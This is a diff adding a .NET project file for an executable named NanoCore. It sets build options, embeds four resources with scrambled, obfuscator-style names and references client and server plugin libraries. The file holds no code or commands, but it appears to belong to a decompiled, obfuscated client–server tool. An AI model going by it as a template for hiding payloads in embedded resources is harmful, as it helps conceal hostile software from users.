@@ -1,0 +1,42 @@
+<Project Sdk="Microsoft.NET.Sdk.WindowsDesktop">
+  <PropertyGroup>
+    <AssemblyName>NanoCore</AssemblyName>
+    <GenerateAssemblyInfo>False</GenerateAssemblyInfo>
+    <OutputType>WinExe</OutputType>
+    <UseWindowsForms>True</UseWindowsForms>
+    <TargetFramework>net20</TargetFramework>
+    <PlatformTarget>x86</PlatformTarget>
+  </PropertyGroup>
+  <PropertyGroup>
+    <LangVersion>12.0</LangVersion>
+    <AllowUnsafeBlocks>True</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>app.ico</ApplicationIcon>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <RootNamespace />
+  </PropertyGroup>
+  <ItemGroup>
+    <None Remove="dQq1Cx1VbcYWHUehew.artNy78tGiZRfZXjIU" />
+    <None Remove="IH0itghNpiTfbZuwjG.9Ef3p7T2phSLlhNo0k" />
+    <None Remove="5G2VwgZFycyI9AX3OV.5E8NuHNDYsiDHu2Km0" />
+    <None Remove="tciLnDobHjAxbLseaL.nsYexfrawa3IjKj96p" />
+    <EmbeddedResource Include="dQq1Cx1VbcYWHUehew.artNy78tGiZRfZXjIU" LogicalName="dQq1Cx1VbcYWHUehew.artNy78tGiZRfZXjIU" />
+    <EmbeddedResource Include="IH0itghNpiTfbZuwjG.9Ef3p7T2phSLlhNo0k" LogicalName="IH0itghNpiTfbZuwjG.9Ef3p7T2phSLlhNo0k" />
+    <EmbeddedResource Include="5G2VwgZFycyI9AX3OV.5E8NuHNDYsiDHu2Km0" LogicalName="5G2VwgZFycyI9AX3OV.5E8NuHNDYsiDHu2Km0" />
+    <EmbeddedResource Include="tciLnDobHjAxbLseaL.nsYexfrawa3IjKj96p" LogicalName="tciLnDobHjAxbLseaL.nsYexfrawa3IjKj96p" />
+  </ItemGroup>
+  <ItemGroup>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="ServerPlugin">
+      <HintPath>..\..\ServerPlugin.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Xml" />
+    <Reference Include="System.Data.SQLite">
+      <HintPath>..\..\System.Data.SQLite.dll</HintPath>
+    </Reference>
+    <Reference Include="ClientPlugin">
+      <HintPath>..\..\ClientPlugin.dll</HintPath>
+    </Reference>
+  </ItemGroup>
+</Project>
